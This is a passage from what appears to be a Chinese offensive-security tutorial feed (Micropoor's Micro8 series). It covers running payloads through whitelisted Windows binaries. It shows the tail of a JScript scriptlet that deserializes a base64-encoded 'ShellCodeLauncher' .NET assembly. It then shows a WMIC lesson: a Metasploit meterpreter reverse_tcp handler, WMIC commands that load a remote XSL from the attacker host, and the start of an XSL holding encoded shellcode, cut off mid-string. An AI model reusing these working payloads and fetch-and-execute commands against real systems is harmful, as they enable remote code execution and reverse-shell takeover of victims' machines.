class="line">&quot;QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T&quot;+</span><br><span class="line">&quot;dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs&quot;+</span><br><span class="line">&quot;cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F&quot;+</span><br><span class="line">&quot;eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A&quot;+</span><br><span class="line">&quot;RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp&quot;+</span><br><span class="line">&quot;ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ&quot;+</span><br><span class="line">&quot;AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH&quot;+</span><br><span class="line">&quot;AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy&quot;+</span><br><span class="line">&quot;YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl&quot;+</span><br><span class="line">&quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs&quot;+</span><br><span class="line">&quot;dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy&quot;+</span><br><span class="line">&quot;aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA&quot;+</span><br><span class="line">&quot;AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW&quot;+</span><br><span class="line">&quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+</span><br><span class="line">&quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA&quot;+</span><br><span class="line">&quot;RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+</span><br><span class="line">&quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+</span><br><span class="line">&quot;AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp&quot;+</span><br><span class="line">&quot;AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA&quot;+</span><br><span class="line">&quot;bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu&quot;+</span><br><span class="line">&quot;AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA&quot;+</span><br><span class="line">&quot;NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB&quot;+</span><br><span class="line">&quot;AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs&quot;+</span><br><span class="line">&quot;ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA&quot;;</span><br><span class="line">var entry_class = &apos;ShellCodeLauncher.Program&apos;; </span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">setversion();</span><br><span class="line">var stm = base64ToStream(serialized_obj);</span><br><span class="line">var fmt = new ActiveXObject(&apos;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&apos;);</span><br><span class="line">var al = new ActiveXObject(&apos;System.Collections.ArrayList&apos;);</span><br><span class="line">var d = fmt.Deserialize_2(stm);</span><br><span class="line">al.Add(undefined);</span><br><span class="line">var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); </span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">debug(e.message);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;/component&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>80、基于白名单Wmic执行payload第十季</title>
      <link href="/article/80_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%AD%A3.html"/>
      <url>/article/80_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。</p><h3 id="Wmic简介："><a href="#Wmic简介：" class="headerlink" title="Wmic简介："></a>Wmic简介：</h3><p>WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具），提供了从命令行接口和批命令脚本执行系统管理的支持。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。WMIC改变了这种情况。</p><p><strong>说明：</strong>Wmic.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Wmic调用。</p><p>Windows 2003 默认位置：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\wbem\wmic.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\wbem\wmic.exe</span><br></pre></td></tr></table></figure><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\wbem\WMIC.exe</span><br><span class="line">C:\Windows\SysWOW64\wbem\WMIC.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong><br>192.168.1.4 Debian<br><strong>靶机：</strong><br>192.168.1.119 Windows 2003<br>192.168.1.5 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, proce ss, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line"></span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line"></span><br><span class="line">0 Wildcard Target 23</span><br></pre></td></tr></table></figure><p><img src="../do/media/b48a63a7b8dc65c874cfbc5a624c3441.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><p><strong>Windows 7：</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\wbem\WMIC.exe os get</span><br><span class="line">/format:&quot;http://192.168.1.4/Micropoor.xsl&quot;</span><br></pre></td></tr></table></figure><p><img src="../do/media/739a77fc254c6ee0022c0d659604b805.jpg" alt></p><p><img src="../do/media/8efda9d1fa52d730918a573936128982.jpg" alt></p><p><strong>Windows 2003：</strong><br><img src="../do/media/6dc9319ccfc77a880c4884f50123d5c7.jpg" alt></p><p><img src="../do/media/a9c870954f9e489117b0fcb42fef90c0.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIC.exe os get /format:&quot;http://192.168.1.4/Micropoor_2003.xsl&quot;</span><br></pre></td></tr></table></figure><p><img src="../do/media/2815861c10d1da765b0c3b4456425efc.jpg" alt></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p><strong>Micropoor_Win7.xsl：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">'1.0'</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;stylesheet</span><br><span class="line"></span><br><span class="line">xmlns=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> xmlns:ms=<span class="string">"urn:schemas‐microsoft‐com:xslt"</span></span><br><span class="line"></span><br><span class="line">xmlns:user=<span class="string">"placeholder"</span></span><br><span class="line"></span><br><span class="line">version=<span class="string">"1.0"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;output method=<span class="string">"text"</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;ms:script implements‐prefix=<span class="string">"user"</span> language=<span class="string">"JScript"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;![CDATA[ </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setversion</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params">s</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64ToStream</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> enc = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Text.ASCIIEncoding"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> length = enc.GetByteCount_2(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ba = enc.GetBytes_4(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Security.Cryptography.FromBase64Transform"</span>);</span><br><span class="line"></span><br><span class="line">ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ms = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.IO.MemoryStream"</span>);</span><br><span class="line"></span><br><span class="line">ms.Write(ba, <span class="number">0</span>, (length / <span class="number">4</span>) * <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">ms.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ms;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> serialized_obj = <span class="string">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"</span>+</span><br><span class="line"><span class="string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span>+</span><br><span class="line"><span class="string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span>+</span><br><span class="line"><span class="string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span>+</span><br><span class="line"><span class="string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span>+</span><br><span class="line"><span class="string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span>+</span><br><span class="line"><span class="string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span>+</span><br><span class="line"><span class="string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span>+</span><br><span class="line"><span class="string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span>+</span><br><span class="line"><span class="string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span>+</span><br><span class="line"><span class="string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span>+</span><br><span class="line"><span class="string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span>+</span><br><span class="line"><span class="string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span>+</span><br><span class="line"><span class="string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span>+</span><br><span class="line"><span class="string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span>+</span><br><span class="line"><span class="string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span>+</span><br><span class="line"><span class="string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span>+</span><br><span class="line"><span class="string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span>+</span><br><span class="line"><span class="string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span>+</span><br><span class="line"><span class="string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span>+</span><br><span class="line"><span class="string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span>+</span><br><span class="line"><span class="string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span>+</span><br><span class="line"><span class="string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA"</span>+</span><br><span class="line"><span class="string">"AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA"</span>+</span><br><span class="line"><span class="string">"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA"</span>+</span><br><span class="line"><span class="string">"KAIAAAYAACoAAAAAAAAA/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH"</span>+</span><br><span class="line"><span class="string">"4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL"</span>+</span><br><span class="line"><span class="string">"WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/"</span>+</span><br><span class="line"><span class="string">"0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/"</span>+</span><br><span class="line"><span class="string">"1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBW"</span>+</span><br><span class="line"><span class="string">"U1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMp"</span>+</span><br><span class="line"><span class="string">"xnXBw7vwtaJWagBT/9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKChYGjml+"</span>+</span><br><span class="line"><span class="string">"AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo"</span>+</span><br><span class="line"><span 